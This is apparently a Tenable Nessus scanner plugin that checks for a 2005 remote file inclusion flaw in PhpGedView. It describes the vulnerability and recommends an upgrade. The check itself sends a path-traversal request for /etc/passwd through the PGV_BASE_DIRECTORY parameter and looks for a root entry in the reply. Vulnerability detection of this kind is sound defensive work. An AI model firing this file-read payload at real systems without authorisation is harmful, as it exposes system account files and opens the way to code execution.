#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(20339);
  script_version("$Revision: 1.23 $");
  script_cvs_date("$Date: 2017/04/25 14:31:38 $");

  script_cve_id("CVE-2005-4467", "CVE-2005-4468", "CVE-2005-4469");
  script_bugtraq_id(15983);
  script_osvdb_id(22009, 22010);

  script_name(english:"PhpGedView PGV_BASE_DIRECTORY Parameter Remote File Inclusion");
  script_summary(english:"Checks for PGV_BASE_DIRECTORY parameter remote file include vulnerability in PhpGedView");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to a
remote file inclusion attack." );
  script_set_attribute(attribute:"description", value:
"The version of PhpGedView installed on the remote host fails to
sanitize user-supplied input to the 'PGV_BASE_DIRECTORY' parameter of
the 'help_text_vars.php' script before using it in a PHP 'require'
function.

Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker may be able to exploit this flaw to read
arbitrary files on the remote host and/or run arbitrary code, possibly
taken from third-party hosts, subject to the privileges of the web
server user id.

In addition, the application reportedly fails to sanitize user input
to the 'user_language', 'user_email', and 'user_gedcomid' parameters
of the 'login_register.php' script, which could be used by an attacker
to inject arbitrary PHP code into a log file that can then be executed
on the affected host, subject to the permissions of the web server
user id." );
  # https://web.archive.org/web/20120402144344/http://retrogod.altervista.org/phpgedview_337_xpl.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e459da51");
   # http://sourceforge.net/tracker/index.php?func=detail&aid=1386434&group_id=55456&atid=477081
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?07c3dea0" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to PhpGedView 3.3.7 or 4.0 beta 3 and apply the patch
referenced in the vendor advisory above." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2005/12/20");
  script_set_attribute(attribute:"plugin_publication_date", value:"2005/12/21");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpgedview:phpgedview");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2017 Tenable Network Security, Inc.");

  script_dependencies("phpgedview_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP", "www/phpgedview");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80, php:TRUE, embedded:FALSE);

# Test an install.
install = get_install_from_kb(appname:'phpgedview', port:port, exit_on_fail:TRUE);
dir = install['dir'];


# Try to exploit the flaw to read a file.
file = "/etc/passwd";

url =  dir + "/help_text_vars.php?" +
  "PGV_BASE_DIRECTORY=" + file;

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

# There's a problem if...
if (
  # there's an entry for root or...
  egrep(pattern:"root:.*:0:[01]:", string:res[2]) ||
  # we get an error saying it can't open an empty file
  #
  # nb: this suggests register_globals is off, but since the fix
  #     reports "Now, why would you want to do that", the log file
  #     command injection flaw might still exist.
  "Failed opening required ''" >< res[2]
)
{
  if (report_verbosity > 0)
  {
    contents = res[2] - strstr(res[2], "<br />");
    report = '\n' + contents;

    security_hole(port:port, extra:report);
  }
  else security_hole(port);
  exit(0);
}
else exit(0, "The PhpGedView install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
